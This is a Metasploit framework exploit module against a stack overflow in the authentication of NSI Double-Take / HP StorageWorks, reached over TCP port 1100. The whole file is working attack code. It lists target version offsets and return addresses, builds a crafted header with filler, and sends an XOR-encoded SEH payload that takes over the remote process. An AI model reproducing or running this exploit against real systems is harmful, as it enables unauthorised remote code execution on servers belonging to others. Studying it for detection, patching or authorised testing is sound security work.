HP StorageWorks NSI Double Take Remote Overflow Exploit (meta)
==============================================================

##
# $Id: doubletake.rb 4529 2007-03-23 01:08:18Z $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require &#039;msf/core&#039;

module Msf

class Exploits::Windows::Misc::Doubletake < Msf::Exploit::Remote
	include Exploit::Remote::Tcp
	include Exploit::Remote::Seh
	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;doubletake Overflow&#039;,
			&#039;Description&#039;    => %q{
					This Module Exploits a stack overflow in the authentication mechanism of NSI Doubletake which is also rebranded
					as hp storage works Vulnerability found by Titon of Bastard Labs.
			},
			&#039;Author&#039;         => [ &#039;ri0t <ri0t[at]ri0tnet.net>&#039; ],
			&#039;Version&#039;        => &#039;$Revision: 9 $&#039;,
			&#039;References&#039;     => 
				[
				],
			&#039;DefaultOptions&#039; =>
				{
					&#039;EXITFUNC&#039; => &#039;process&#039;,
				},
			&#039;Payload&#039;        =>
				{
					&#039;Space&#039;    => 500,
					&#039;BadChars&#039; => "\x00",
				},
			&#039;Platform&#039;       => &#039;win&#039;,
			
			&#039;Targets&#039;        =>
				[
					[&#039;doubletake 4.5.0&#039;,    { &#039;Ret&#039; =>  0x006f5fa7, &#039;Offset&#039; => 5544 } ],
					[&#039;doubletake 4.4.2&#039;, { &#039;Ret&#039; => 0x0074e307, &#039;Offset&#039; => 944 } ],  
					[&#039;doubletake 4.5.0.1819&#039;, { &#039;Ret&#039; => 0x006e62dd, &#039;Offset&#039; => 5544 } ],
				],
			 &#039;DefaultTarget&#039; => 0,

			&#039;Privileged&#039;     => false,

			&#039;DisclosureDate&#039; => &#039;&#039;

			))

			register_options(
			[
				Opt::RPORT(1100)
			], self.class)
	end

	def exploit
                xor = Rex::Encoding::Xor::Byte
		connect

		print_status("Trying target #{target.name}...")

                header = 
               "\x00\x02\x00\x01\x27\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x00"+
               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"+
               "\x00\x00\x00\x1e\x00\x00\x00\x01\x00\x01"

		filler =  rand_text_english(1) * (target[&#039;Offset&#039;])
		seh = generate_seh_payload(target.ret)
                buffercoded= xor.encode(seh+payload.encoded, [0xf0].pack("C"))
		sploit =  header + filler + buffercoded[0]
		sock.put(sploit)
		handler
		disconnect	
	end

end
end



